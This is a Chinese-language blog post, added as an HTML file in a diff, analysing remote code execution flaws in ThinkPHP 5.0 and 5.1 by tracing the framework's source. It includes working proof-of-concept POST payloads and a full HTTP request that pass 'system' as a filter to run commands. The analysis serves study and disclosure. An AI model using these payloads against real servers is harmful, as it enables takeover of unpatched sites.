@@ -1,0 +1,791 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/icon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#1a1a1a">
+  <meta name="description" content="">
+  <meta name="author" content="Doo-J">
+  <meta name="keywords" content="">
+  <title>thinkphp5.0-1远程代码执行漏洞分析 - Doo-J</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+
+  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Doo-J</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/categories/">分类</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/1.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  星期日, 三月 3日 2019, 7:34 晚上
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    3.6k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      16 分钟
+                  </span>
+                
+
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近看到了thinkphp5最新爆出来的代码执行漏洞，于是便跟着一起学习一下。</p>
+<a id="more"></a>
+
+<h2 id="thinkphp5-1-远程代码执行"><a href="#thinkphp5-1-远程代码执行" class="headerlink" title="thinkphp5.1.* 远程代码执行"></a>thinkphp5.1.* 远程代码执行</h2><h3 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h3><p>thinkphp5.1.* 版本</p>
+<h3 id="触发条件"><a href="#触发条件" class="headerlink" title="触发条件"></a>触发条件</h3><p>thinkphp5 设置 error_reporting(0)</p>
+<h3 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h3><p>thinkphp5.1.31+php7.2.10+apache</p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞文件：\thinkphp\library\think\Request.php<br>漏洞代码如下：</p>
+<pre><code>public function method($origin = false)
+    {
+        if ($origin) {
+            // 获取原始请求类型
+            return $this-&gt;server(&#39;REQUEST_METHOD&#39;) ?: &#39;GET&#39;;
+        } elseif (!$this-&gt;method) {
+            if (isset($_POST[$this-&gt;config[&#39;var_method&#39;]])) {
+                $this-&gt;method    = strtoupper($_POST[$this-&gt;config[&#39;var_method&#39;]]);
+                $method          = strtolower($this-&gt;method);
+                        $this-&gt;{$method} = $_POST;
+            } elseif ($this-&gt;server(&#39;HTTP_X_HTTP_METHOD_OVERRIDE&#39;)) {
+                $this-&gt;method = strtoupper($this-&gt;server(&#39;HTTP_X_HTTP_METHOD_OVERRIDE&#39;));
+            } else {
+                $this-&gt;method = $this-&gt;server(&#39;REQUEST_METHOD&#39;) ?: &#39;GET&#39;;
+            }
+        }
+
+        return $this-&gt;method;
+    }</code></pre><p>在这里存在一个经典的变量覆盖漏洞点<br><code>$this-&gt;method    = strtoupper($_POST[$this-&gt;config[&#39;var_method&#39;]]);</code><br>var_method=_method的值，即POST的_method值会赋值给$this-&gt;method。<br>同时，由<code>$this-&gt;{$method} = $_POST</code>，得$this-&gt;method 会得到 POST的值。<br>举个例子，假如我们POST的数据为a=aaa&amp;b=bbb&amp;_method=www，那么经过method方法后，我们就会得到一个$www变量，它的值为{‘a’=&gt;’aaa’,’b’=&gt;’bbb’,’_method’=&gt;’www’}<br>那么在这里，我们可以控制_method的值，来达到覆盖request.php里任意变量的目的。<br>这里就要提到一个利用函数了：filterValue()<br>代码如下：</p>
+<pre><code>private function filterValue(&amp;$value, $key, $filters)
+    {
+        $default = array_pop($filters);
+
+        foreach ($filters as $filter) {
+            if (is_callable($filter)) {
+                // 调用函数或者方法过滤
+                $value = call_user_func($filter, $value);
+            }
+        ······
+
+        return $value;
+    }</code></pre><p>这个函数的作用是针对每一个$value值，用$filters进行过滤。<br>在这里$filters的值就是$filter的值，如果我们之前POST的_method=filter，那么我们就会覆盖$filter原本的值为我们POST的数据。<br>而foreach将$filter的值遍历出来带入<br><code>$value = call_user_func($filter, $value)</code>中执行。<br>如果我们POST中的数据带有危险函数如system、exec，那么就可以带入call_user_func中进行执行。<br>而执行的对象为$value。在这里，$value的值为request传入的数据，即我们传入的参数值。我们即可带入危险命令进入函数执行。<br>这里分析一下大概的流程</p>
+<ul>
+<li>通过_method变量进行变量覆盖</li>
+<li>在变量覆盖的时候覆盖filter变量，同时传入危险函数名，在call_user_func函数中充当$filter值</li>
+<li>在传递变量时，传入危险命令，在call_user_func函数中充当$value值</li>
+</ul>
+<p>经过全局搜索，我们在route.php里找到如下调用：</p>
+<pre><code>public static function check($request, $url, $depr = &#39;/&#39;, $checkDomain = false)
+    {
+        ······
+
+        $method = strtolower($request-&gt;method());
+        // 获取当前请求类型的路由规则
+
+        ······</code></pre><p>继续向上，发现app.php里有对route::check()的调用：</p>
+<pre><code>public static function routeCheck($request, array $config)
+    {
+        ······
+
+        // 路由检测（根据路由定义返回不同的URL调度）
+        $result = Route::check($request, $path, $depr, $config[&#39;url_domain_deploy&#39;]);
+
+        ······</code></pre><p>而routeCheck在app::run()里存在调用<br>所以我们得出一条调用链：<br>index.php -&gt; start.php -&gt; app.php(app::run()) -&gt; app.php(app::routeCheck()) -&gt; route.php(Route::check()) -&gt; request.php(request::method())<br>之后，thinkphp会处理请求参数，进而对reqeust-&gt;filterValue()进行调用<br>通过上述分析，我们即可得到POC：<br><code>a=system&amp;b=whoami&amp;_method=filter</code><br>测试效果图如下：<br><img src="/images/thinkphp-Snipaste_2019-03-01_16-55-42.png" alt=""><br>其实在这里，变量名a、b根本不重要，同时，变量b也可以是GET参数，如：<br><img src="/images/thinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-Snipaste_2019-03-01_16-58-13.png" alt=""><br>须得注意的是，由于filter被覆盖，程序会抛出一个警告错误，如果不设置error_reporting(0)的话，程序会终止，无法达到代码执行的目的。</p>
+<p>另外，这个漏洞针对thinkphp5.0.2-5.0.12也是成立的。</p>
+<h2 id="thinkphp5-0-12代码执行"><a href="#thinkphp5-0-12代码执行" class="headerlink" title="thinkphp5.0.12代码执行"></a>thinkphp5.0.12代码执行</h2><h3 id="漏洞版本-1"><a href="#漏洞版本-1" class="headerlink" title="漏洞版本"></a>漏洞版本</h3><p>thinkphp5.0.0-5.0.12</p>
+<h3 id="复现环境-1"><a href="#复现环境-1" class="headerlink" title="复现环境"></a>复现环境</h3><p>thinkphp5.0.10+php-7.2.10+apache</p>
+<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在thinkphp5.0.12版本中，method方法不同与5.1版本，它的代码形式是这样的：</p>
+<pre><code>public function method($method = false)
+    {
+        if (true === $method) {
+            // 获取原始请求类型
+            return IS_CLI ? &#39;GET&#39; : (isset($this-&gt;server[&#39;REQUEST_METHOD&#39;]) ? $this-&gt;server[&#39;REQUEST_METHOD&#39;] : $_SERVER[&#39;REQUEST_METHOD&#39;]);
+        } elseif (!$this-&gt;method) {
+            if (isset($_POST[Config::get(&#39;var_method&#39;)])) {
+                $this-&gt;method = strtoupper($_POST[Config::get(&#39;var_method&#39;)]);
+                $this-&gt;{$this-&gt;method}($_POST);
+            } elseif (isset($_SERVER[&#39;HTTP_X_HTTP_METHOD_OVERRIDE&#39;])) {
+                $this-&gt;method = strtoupper($_SERVER[&#39;HTTP_X_HTTP_METHOD_OVERRIDE&#39;]);
+            } else {
+                $this-&gt;method = IS_CLI ? &#39;GET&#39; : (isset($this-&gt;server[&#39;REQUEST_METHOD&#39;]) ? $this-&gt;server[&#39;REQUEST_METHOD&#39;] : $_SERVER[&#39;REQUEST_METHOD&#39;]);
+            }
+        }
+        return $this-&gt;method;
+    }</code></pre><p>依旧是$this-&gt;method 的值来源于 POST参数_method。<br>而下一语句代码：<code>$this-&gt;{$this-&gt;method}($_POST);</code>，表示将执行名为$this-&gt;method的函数，参数值为$_POST。<br>所以说，我们可以通过控制_method的值来达到执行reques里的任意函数的目的。<br>通过5.1.*版本的漏洞，我们知道，在request.php里，要达到代码执行的目的，须通过filterValue里的call_user_func函数实现。向前溯源，即须通过变量覆盖将$filter的值设为危险函数名，我们才可实现。<br>其实在5.0.12版本中，filterValue函数基本无差异：</p>
+<pre><code>private function filterValue(&amp;$value, $key, $filters)
+    {
+        $default = array_pop($filters);
+        foreach ($filters as $filter) {
+            if (is_callable($filter)) {
+                // 调用函数或者方法过滤
+                $value = call_user_func($filter, $value);
+            } elseif (is_scalar($value)) {
+                if (false !== strpos($filter, &#39;/&#39;)) {
+                    // 正则过滤
+      ······</code></pre><p>基于这个目的，我们将目光放在这个函数上：__constract()<br>代码如下：</p>
+<pre><code>protected function __construct($options = [])
+    {
+        foreach ($options as $name =&gt; $item) {
+            if (property_exists($this, $name)) {
+                $this-&gt;$name = $item;
+            }
+        }
+        if (is_null($this-&gt;filter)) {
+            $this-&gt;filter = Config::get(&#39;default_filter&#39;);
+        }
+
+        // 保存 php://input
+        $this-&gt;input = file_get_contents(&#39;php://input&#39;);
+    }</code></pre><p>在这段代码中，函数通过foreach循环，将$options中的值分离出来，用propeprty_exists检查$this是否存在$item属性，如果存在，则对它进行赋值。<br>如果我们POST的数据如下：<br><code>_method=__construct&amp;filter=system</code><br>那么，我们就可以根据method方法进入__constract函数中。再由foreach检查是this是否存在_method和filter属性，对其分别赋值。<br>至此，我们就找到了对$filter变量进行控制的方法了。<br>再控制$value为危险函数命令，即可进行代码执行<br>总结一下流程：</p>
+<ul>
+<li>_method数据控制进入__constract函数</li>
+<li>$_POST数据对$filte变量进行赋值使之为危险函数</li>
+<li>$request 控制危险函数命令</li>
+</ul>
+<p>调用流程跟上一个一样<br>index.php -&gt; start.php -&gt; app.php(app::run()) -&gt; app.php(app::routeCheck()) -&gt; route.php(Route::check()) -&gt; request.php(request::method()) -&gt; reqeust.php(request::__constract())<br>所以，poc如下：<br><code>a=whoami&amp;_method=__construct&amp;filter=system</code><br>效果如下：<br><img src="/images/thinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-Snipaste_2019-03-01_22-12-04.png" alt=""><br>在此次，$value依旧是任意request值，所以，GET数据依然有效：<br><img src="/images/thinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-Snipaste_2019-03-01_22-13-56.png" alt="">  </p>
+<h2 id="thinkphp5-0-23核心板代码执行"><a href="#thinkphp5-0-23核心板代码执行" class="headerlink" title="thinkphp5.0.23核心板代码执行"></a>thinkphp5.0.23核心板代码执行</h2><h3 id="漏洞版本-2"><a href="#漏洞版本-2" class="headerlink" title="漏洞版本"></a>漏洞版本</h3><p>thinkphp5.0.13-5.0.23</p>
+<h3 id="复现环境-2"><a href="#复现环境-2" class="headerlink" title="复现环境"></a>复现环境</h3><p>thinkphp5.0.23核心版+php7.2.10+apache</p>
+<h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在之前的两个版本中，漏洞实现的核心都是通过</p>
+<ul>
+<li>request.php的method方法进行变量覆盖，</li>
+<li>调用filterValue进行代码执行。</li>
+</ul>
+<p>无论中间的步骤如何，最核心的步骤都是这两个。<br>但是在thinkphp5.0.13后，在app.php中新增了如下代码：</p>
+<pre><code>public static function module($result, $config, $convert = null)
+    {
+
+      ······
+
+      // 设置默认过滤机制
+        $request-&gt;filter($config[&#39;default_filter&#39;]);
+
+      ······</code></pre><p>我们来回顾一下之前的调用流程：<br>index.php -&gt; start.php -&gt; app.php(app::run()) -&gt; app.php(app::routeCheck()) -&gt; route.php(Route::check()) -&gt; request.php(request::method())<br>在之前版本的代码中，我们在method的方法中对变量进行覆盖。<br>但是，在之后版本中，由于在thinkphp处理请求参数之前，调用了app::module()，对$filter进行了重定义，将我们覆盖的值又进行覆盖。<br>所以之前版本的利用流程不可用，需要更新利用方式。<br>在这个版本的代码中，我们要通过method()变量覆盖达到代码执行的目的，需要满足两个条件：</p>
+<ul>
+<li>调用reqeust::method()</li>
+<li>在app:module()执行之前调用requeest::filterValue()  </li>
+</ul>
+<p>经过查找，发现request::param()对method()进行了调用：</p>
+<pre><code>public function param($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
+    {
+        if (empty($this-&gt;mergeParam)) {
+            $method = $this-&gt;method(true);
+            // 自动获取请求变量
+            ······
+    }</code></pre><p>method参数为true，会进入request::server()</p>
+<pre><code>public function method($method = false)
+    {
+        if (true === $method) {
+            // 获取原始请求类型
+            return $this-&gt;server(&#39;REQUEST_METHOD&#39;) ?: &#39;GET&#39;;
+        ······
+    }</code></pre><p>进入server方法：</p>
+<pre><code>public function server($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
+    {
+        if (empty($this-&gt;server)) {
+            $this-&gt;server = $_SERVER;
+        }
+        if (is_array($name)) {
+            return $this-&gt;server = array_merge($this-&gt;server, $name);
+        }
+        return $this-&gt;input($this-&gt;server, false === $name ? false : strtoupper($name), $default, $filter);
+    }</code></pre><p>继续进入input方法：</p>
+<pre><code>public function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
+    {
+        ······
+
+        // 解析过滤器
+        $filter = $this-&gt;getFilter($filter, $default);
+
+        if (is_array($data)) {
+            array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);
+            reset($data);
+        } else {
+
+            $this-&gt;filterValue($data, $name, $filter);
+        }
+        ······
+    }</code></pre><p>在此处，依次跟踪传入参数，如下：</p>
+<ul>
+<li>$this-&gt;server(‘REQUEST_METHOD’) -&gt; requuest::server()</li>
+<li>$this-&gt;server,$this-&gt;server(‘REQUEST_METHOD’) -&gt; request::input()</li>
+</ul>
+<p>在input方法中，有如下一段代码：</p>
+<pre><code>foreach (explode(&#39;.&#39;, $name) as $val) {
+                if (isset($data[$val])) {
+                    $data = $data[$val];
+                } else {
+                    // 无输入数据，返回默认值
+                    return $default;
+                }
+            }</code></pre><p>可以看出，$data即为server[‘REQUEST_METHOD’]的值。<br>然后，$data进入$this-&gt;filterValue函数：<br><code>$this-&gt;filterValue($data, $name, $filter);</code><br>拉通来看，即在param函数中，对server[‘REQUEST_METHOD’]中的值调用了一次filterValue方法。<br>在app.php中，存在如下代码：</p>
+<pre><code>// 记录路由和请求信息
+            if (self::$debug) {
+                Log::record(&#39;[ ROUTE ] &#39; . var_export($dispatch, true), &#39;info&#39;);
+                Log::record(&#39;[ HEADER ] &#39; . var_export($request-&gt;header(), true), &#39;info&#39;);
+                Log::record(&#39;[ PARAM ] &#39; . var_export($request-&gt;param(), true), &#39;info&#39;);
+            }</code></pre><p>即程序开启debug模式，会调用一次$request-&gt;param()函数。<br>满足了漏洞利用的条件。<br>所以，poc如下：<br><code>_method=__construct&amp;filter=system&amp;server[REQUEST_METHOD]=whoami</code><br>效果如下：<br><img src="/images/thinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-Snipaste_2019-03-03_15-16-46.png" alt="">  </p>
+<h2 id="thinkphp5-0-23完整版代码执行"><a href="#thinkphp5-0-23完整版代码执行" class="headerlink" title="thinkphp5.0.23完整版代码执行"></a>thinkphp5.0.23完整版代码执行</h2><h3 id="漏洞版本-3"><a href="#漏洞版本-3" class="headerlink" title="漏洞版本"></a>漏洞版本</h3><p>thinkphp5.0.0-thinkphp5.0.23</p>
+<h3 id="复现环境-3"><a href="#复现环境-3" class="headerlink" title="复现环境"></a>复现环境</h3><p>thinkphp5.0.23完整版+php7.2.10+apache</p>
+<h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>上一个漏洞分析讲过，漏洞利用有两个条件：</p>
+<ul>
+<li>调用reqeust::method()</li>
+<li>在app:module()执行之前调用requeest::filterValue()</li>
+</ul>
+<p>但其实，如果app::module()方法不执行，一样可以达成目的。<br>分析一下为什么要执行app::module()方法？<br>在app::run()中看到如下代码：<br><code>$data = self::exec($dispatch, $config);</code><br>跟进exec()方法：</p>
+<pre><code>protected static function exec($dispatch, $config)
+    {
+        switch ($dispatch[&#39;type&#39;]) {
+            case &#39;redirect&#39;: // 重定向跳转
+                $data = Response::create($dispatch[&#39;url&#39;], &#39;redirect&#39;)
+                    -&gt;code($dispatch[&#39;status&#39;]);
+                break;
+            case &#39;module&#39;: // 模块/控制器/操作
+                $data = self::module(
+                    $dispatch[&#39;module&#39;],
+                    $config,
+                    isset($dispatch[&#39;convert&#39;]) ? $dispatch[&#39;convert&#39;] : null
+                );
+                break;
+            case &#39;controller&#39;: // 执行控制器操作
+                $vars = array_merge(Request::instance()-&gt;param(), $dispatch[&#39;var&#39;]);
+                $data = Loader::action(
+                    $dispatch[&#39;controller&#39;],
+                    $vars,
+                    $config[&#39;url_controller_layer&#39;],
+                    $config[&#39;controller_suffix&#39;]
+                );
+                break;
+            case &#39;method&#39;: // 回调方法
+                $vars = array_merge(Request::instance()-&gt;param(), $dispatch[&#39;var&#39;]);
+                $data = self::invokeMethod($dispatch[&#39;method&#39;], $vars);
+                break;
+
+                ······
+    }</code></pre><p>在这里面，我们看到了熟悉的param()方法，这个方法就是导致5.0.23核心版代码执行的罪魁祸首。<br>同时，由<code>switch ($dispatch[&#39;type&#39;])</code>可知，如果我们控制了$dispatch[‘type’]的值，就可以控制exec()方法执行的函数，就可以达成跳过app::module()方法的目的。<br>再来溯源$dispatch变量：<br>在app::run()中：</p>
+<pre><code>if (empty($dispatch)) {
+                $dispatch = self::routeCheck($request, $config);
+            }</code></pre><p>进入routeCheck()方法中：</p>
+<pre><code>public static function routeCheck($request, array $config)
+    {
+        $path   = $request-&gt;path();
+        $depr   = $config[&#39;pathinfo_depr&#39;];
+        $result = false;
+
+        ······
+
+        // 路由检测（根据路由定义返回不同的URL调度）
+        $result = Route::check($request, $path, $depr, $config[&#39;url_domain_deploy&#39;]);
+        $must   = !is_null(self::$routeMust) ? self::$routeMust : $config[&#39;url_route_must&#39;];
+
+        if ($must &amp;&amp; false === $result) {
+            // 路由无效
+            throw new RouteNotFoundException();
+        }
+
+        ···
+
+        return $result;
+    }</code></pre><p>返回值$result跟$Route::check()有关，继续跟进：</p>
+<pre><code>public static function check($request, $url, $depr = &#39;/&#39;, $checkDomain = false)
+    {
+        ······
+
+        $method = strtolower($request-&gt;method());
+        // 获取当前请求类型的路由规则
+        $rules = isset(self::$rules[$method]) ? self::$rules[$method] : [];
+        // 检测域名部署
+
+        ······
+
+        // 路由规则检测
+        if (!empty($rules)) {
+            return self::checkRoute($request, $rules, $url, $depr);
+        }
+        return false;
+    }</code></pre><p>在这里，又一次执行了我们熟悉的$request-&gt;method()方法。<br>在method()方法中，我们进行了一次变量覆盖。<br>同时，由<br><code>$this-&gt;method = strtoupper($_POST[Config::get(&#39;var_method&#39;)]);</code><br><code>return $this-&gt;method;</code><br>可知我们得到的时$method的值。同时，$rules获得名为$method的路由规则。<br>跟进route::checkRoute():</p>
+<pre><code>private static function checkRoute($request, $rules, $url, $depr = &#39;/&#39;, $group = &#39;&#39;, $options = [])
+    {
+        foreach ($rules as $key =&gt; $item) {
+
+            ······
+
+            if (is_array($rule)) {
+
+                ······
+
+                $result = self::checkRule($rule, $route, $url, $pattern, $option, $depr);
+                if (false !== $result) {
+                    return $result;
+                }
+            }
+        }
+
+        ······
+    }</code></pre><p>经过试调，$result值来源于self::checkRule()方法，继续跟进：</p>
+<pre><code>private static function checkRule($rule, $route, $url, $pattern, $option, $depr)
+    {
+
+        ······
+
+        if ($len1 &gt;= $len2 || strpos($rule, &#39;[&#39;)) {
+
+            ······
+
+            if (false !== $match = self::match($url, $rule, $pattern)) {
+                // 匹配到路由规则
+                return self::parseRule($rule, $route, $url, $option, $match);
+            }
+        }
+        return false;
+    }</code></pre><p>此处，返回的值与self::parseRule()有关，继续跟进：</p>
+<pre><code>private static function parseRule($rule, $route, $pathinfo, $option = [], $matches = [], $fromCache = false)
+    {
+        ······
+
+            elseif (false !== strpos($route, &#39;\\&#39;)) {
+            // 路由到方法
+            list($path, $var) = self::parseUrlPath($route);
+            $route            = str_replace(&#39;/&#39;, &#39;@&#39;, implode(&#39;/&#39;, $path));
+            $method           = strpos($route, &#39;@&#39;) ? explode(&#39;@&#39;, $route) : $route;
+            $result           = [&#39;type&#39; =&gt; &#39;method&#39;, &#39;method&#39; =&gt; $method, &#39;var&#39; =&gt; $var];
+        }
+
+        ······
+
+        return $result;
+    }</code></pre><p>可以看到，只要满足false ！== strpos($route, ‘\\‘)，就可以进入路由到方法，控制dispatch[‘type’]值为method，从而进入app::exec()方法中的method()回调方法，执行<code>Request::instance()-&gt;param()</code>，达成利用条件。<br>在完整版中，thinkphp多了一些东西：<br><img src="/images/thinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-Snipaste_2019-03-03_18-32-13.png" alt=""><br>在\topthink\think-captcha\src\helper.php中存在：<br><code>\think\Route::get(&#39;captcha/[:id]&#39;, &quot;\\think\\captcha\\CaptchaController@index&quot;);</code><br>这里调用\think\route::get进行路由注册，而在我们跟踪流程中发现在$Route::check()中可以通过覆盖$mthod值达到获取任意名为$method的路由规则。<br>如果我们覆盖$method的值为get，就会获得get类型的路由，再传入参数值为captcha，即可获得上面的路由规则：<code>\\think\\captcha\\CaptchaController@index</code>。<br>刚好符合进入路由到方法的条件。<br>再通过层层返回，可以进入app::exec()中的method回调方法，执行<code>Request::instance()-&gt;param</code>。<br>所以，poc如下：</p>
+<pre><code>POST /thinkphp_5.0.23_with_extend/public/index.php?s=captcha HTTP/1.1
+Host: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 74
+
+_method=__construct&amp;filter=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</code></pre><p>效果如下：<br><img src="/images/thinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-Snipaste_2019-03-03_18-43-16.png" alt=""></p>
+<h2 id="变异poc"><a href="#变异poc" class="headerlink" title="变异poc"></a>变异poc</h2><p>网上的大佬太多了，一个个的poc骚到不行，这里再贴一条大佬的变异poc：<br><code>_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</code></p>
+<h2 id="个人想法"><a href="#个人想法" class="headerlink" title="个人想法"></a>个人想法</h2><ul>
+<li>这四个版本的漏洞，本质上都是由一个漏洞点引起的。无论是覆盖不同的函数，还是越过module()方法的执行，本身就是花式满足漏洞触发条件。由于thinkphp的灵活，关于这个漏洞点的利用方式应该不止我列举的这四种。就像完整版之于核心版，由于插件的富余，使之利用点多了一个。</li>
+<li>其实，搞清楚具体的调用流程，对分析如何达成漏洞利用条件还是很有帮助的。就比如5.0.12版本之后的代码，由于module()方法对filterValue进行重定义，导致之前的poc链不成立。而通过分析thinkphp执行流程我们发现module()方法执行之前可以调用其他函数，也可以覆盖某些值以到达不执行module()函数。所以，调用流程的分析很有必要。</li>
+</ul>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                  <span>
+                <i class="iconfont icon-inbox"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
+                      &nbsp;
+                    
+                  </span>&nbsp;&nbsp;
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/thinkphp5/">thinkphp5</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" target="_blank" rel="nofollow noopener noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/03/06/web-crypto/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span class="hidden-mobile">web-crypto</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-6">
+                    
+                    
+                      <a href="/2019/02/26/py%E8%84%9A%E6%9C%AC%E4%B9%8Bmyinotify/">
+                        <span class="hidden-mobile">py脚本之myinotify</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><span style="color:white;"><i class="far fa-list-alt"></i>&nbsp;目录</span></p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
+<script  src="/js/main.js" ></script>
+
